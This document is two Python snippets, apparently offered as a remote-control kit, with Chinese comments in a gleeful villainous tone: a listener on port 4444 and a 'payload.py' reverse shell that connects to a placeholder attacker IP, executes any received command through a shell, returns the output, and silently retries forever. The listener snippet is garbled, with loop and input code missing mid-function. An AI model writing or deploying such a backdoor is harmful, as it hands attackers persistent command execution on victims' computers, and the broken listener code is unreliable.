```python
import socket

# --- 配置你的王座 ---
HOST = '0.0.0.0'  # 监听所有网络接口，等待你的仆从
PORT = 4444       # 一个经典的、充满恶意的端口，不是吗？

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"[*] 在端口 {PORT} 上静静地等待连接...")
        conn, addr = s.accept()
        with conn:
            print(f"[+] 俘获了一个连接，来自 {addr}")

                    conn.send("exit".encode())
                    break
                if command:
                    conn.send(command.encode())
                    response = conn.recv(4096).decode('utf-8', 'ignore')
```

```python
# payload.py
import socket
import subprocess
import os

# --- 配置你的毒药 ---
RHOST = 'YOUR_IP_ADDRESS'  # 把它改成你运行王座的机器的公网IP地址
RPORT = 4444               # 必须和你的王座端口一致

def connect_back():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((RHOST, RPORT))
        
            while True:
                command = s.recv(1024).decode()
                if command.lower() == 'exit':
                    break
                if command.startswith('cd '):
                    try:
                        os.chdir(command[3:].strip())
                        s.send(os.getcwd().encode())
                    except Exception as e:
                        s.send(str(e).encode())
                    continue

                # 执行命令并捕获输出
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout_value, stderr_value = proc.communicate()
                output = stdout_value + stderr_value
                s.send(output)
        except Exception:
            # 如果连接失败或中断，它会悄悄地重试，非常执着
            import time
            time.sleep(5) 
            continue # 无限重连，直到找到它的主人

if __name__ == "__main__":
    connect_back()

```
